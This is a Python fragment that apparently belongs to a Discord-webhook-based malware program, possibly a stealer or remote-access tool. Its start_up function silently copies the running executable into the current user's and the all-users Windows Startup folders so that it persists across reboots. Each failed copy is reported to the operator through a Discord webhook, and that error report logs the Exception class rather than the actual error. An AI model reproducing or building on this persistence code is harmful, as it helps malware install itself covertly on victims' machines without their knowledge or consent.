def start_up_error():
    from __webhook import _WebhookX
    from dhooks import Embed
    from config import Config 
    cc = Config()


    webx = _WebhookX().get_object()
    embed = Embed(
        description='Error while copying to startup',
        color=16399677,
        timestamp='now'  # sets the timestamp to current time
    )


    embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
    embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
    embed.add_field(name="Coudn't copy to startup | Help us by reporting this bug", value=f'Advanced Log: ```{Exception}```')

    webx.send(embed=embed)
    
def start_up():
    import shutil
    import os
    from sys import argv

    roaming = os.getenv("appdata")

    startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    common_startup_loc = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"

    try:
        shutil.copy(argv[0], startup_loc)
    except Exception:
        start_up_error()
        
    try:
        shutil.copy(argv[0], common_startup_loc)
    except Exception:
        start_up_error()
        
    
        